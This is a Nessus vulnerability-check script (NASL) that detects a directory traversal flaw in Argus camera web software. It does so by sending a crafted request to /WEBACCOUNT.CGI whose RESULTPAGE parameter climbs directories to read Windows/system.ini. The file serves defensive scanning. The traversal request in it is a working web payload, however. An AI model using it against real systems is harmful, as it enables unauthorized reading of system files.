###############################################################################
# Nessus Vulnerability Test
#
###############################################################################

if(description)
{
  script_id(51799025);
  script_version("$Revision: 10852 $");
  script_name(english:"Argus Directory traversal vulnerability");
  
  script_category(ACT_GATHER_INFO);
  script_copyright("This script is Copyright (C) 2005 WEBRAY");
  script_family(english:"Camera");
  script_dependencies( "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_set_attribute(attribute:"risk_factor", value:"High");
  script_set_attribute(attribute:"solution", value:"Whitelist control of file suffixes and reject malicious symbols or empty bytes");
  script_set_attribute(
    attribute:"description",
    value:"Detect Argus Directory traversal vulnerability.");
  exit(0);
}
include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("webapp_func.inc");

host=get_host_name();
port=get_http_port(default:80);
#display("port=="+port);
 url='/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="'; 
 req = http_get(item:url, port:port);  
 res = http_keepalive_send_recv(port:port, data:req); 


 
 if("200 OK"><res && "drivers"><res){
	if (report_verbosity > 0) security_hole(port:port, extra:req+res);
			  else security_hole(port);
 }	 
 

exit(0);
